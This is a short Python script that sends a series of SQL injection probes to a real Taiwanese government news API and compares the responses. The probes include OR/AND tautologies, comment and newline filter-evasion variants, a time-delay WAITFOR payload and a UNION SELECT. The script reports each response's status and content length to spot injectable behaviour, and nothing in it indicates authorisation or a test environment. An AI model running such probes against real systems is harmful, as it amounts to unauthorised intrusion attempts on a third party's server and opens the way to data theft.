import subprocess, time
url0='https://www.land.nat.gov.tw/Api/NewsIndexList'
variants=[
    ('baseline','area=101'),
    ('or1=1_upper','area=101%20OR%201=1'),
    ('or1=2_upper','area=101%20OR%201=2'),
    ('or1=1_lower','area=101%20or%201=1'),
    ('or1=2_lower','area=101%20or%201=2'),
    ('and1=1_upper','area=101%20AND%201=1'),
    ('and1=2_upper','area=101%20AND%201=2'),
    ('or_comment','area=101%20/**/OR/**/1=1'),
    ('or_newline','area=101%0aOR%0a1=1'),
    ('waitfor_upper','area=101;WAITFOR%20DELAY%20%270:0:3%27'),
    ('union_upper','area=101%20UNION%20SELECT%201,2'),
]
for name,q in variants:
    url=url0+'?'+q
    r=subprocess.run(['curl','-sS','-m','15','-A','Mozilla/5.0','-D','-','-o','/dev/null',url],capture_output=True,text=True)
    lines=r.stdout.splitlines()
    status=lines[0] if lines else 'NO_RESPONSE'
    cl=''
    for l in lines:
        if l.lower().startswith('content-length:'):
            cl=l.split(':',1)[1].strip()
    print(f'{name:20s} | {status:25s} | CL={cl:6s}')
    time.sleep(0.3)
